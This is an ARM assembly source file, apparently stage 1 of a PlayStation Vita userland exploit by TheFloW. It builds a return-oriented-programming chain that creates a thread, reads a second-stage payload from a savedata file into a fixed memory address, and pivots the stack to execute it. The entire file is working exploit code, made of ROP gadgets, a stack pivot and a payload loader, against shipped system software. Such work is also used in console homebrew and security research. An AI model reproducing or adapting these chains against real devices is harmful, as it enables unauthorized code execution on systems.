/* stage1.S -- load and execute stage2
 *
 * Copyright (C) 2018 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

.include "../include/constants.S"
.include "../include/functions.S"
.include "../include/gadgets.S"
.include "../include/macros.S"

// stage2 information
.equ STAGE2_ADDRESS, 0x81e82000
.equ STAGE2_SIZE,    0x30000

.global _start
_start:
  // Create a new thread whose stack base address should be at 0x81e81000
  call_vvvvvvv sceKernelCreateThread, empty_string, pop_pc, SCE_KERNEL_DEFAULT_PRIORITY, 0x40000, 0, 0, NULL
  store_rv     ret, thread_id

  // Load stage2
  call_vvv sceIoOpen,  savedata0_system_dat_path, SCE_O_RDONLY, 0
  store_rv ret,        system_dat_fd
  call_lvv sceIoRead,  system_dat_fd, STAGE2_ADDRESS - (0x48 + 0x4 + _end - _start), STAGE2_SIZE
  call_l   sceIoClose, system_dat_fd

  // Start thread and stack pivot
  call_lvv sceKernelStartThread, thread_id, thread_rop_end - thread_rop_start, thread_rop_start

  // Exit and delete thread
  call_v sceKernelExitDeleteThread, 0

// Data section

// Thread rop chain
thread_rop_start:
  set_r0_r2_ip_sp_lr_pc ldm_data_r0
thread_rop_end:

// ldm data for setting sp
ldm_data_r0:   .word 0xDEADBEEF     // r0
               .word 0xDEADBEEF     // r2
               .word 0xDEADBEEF     // ip
               .word STAGE2_ADDRESS // sp
               .word 0xDEADBEEF     // lr
               .word pop_pc         // pc

// Thread id
thread_id:     .word 0xDEADBEEF

// stage2 fd
system_dat_fd: .word 0xDEADBEEF

_end:
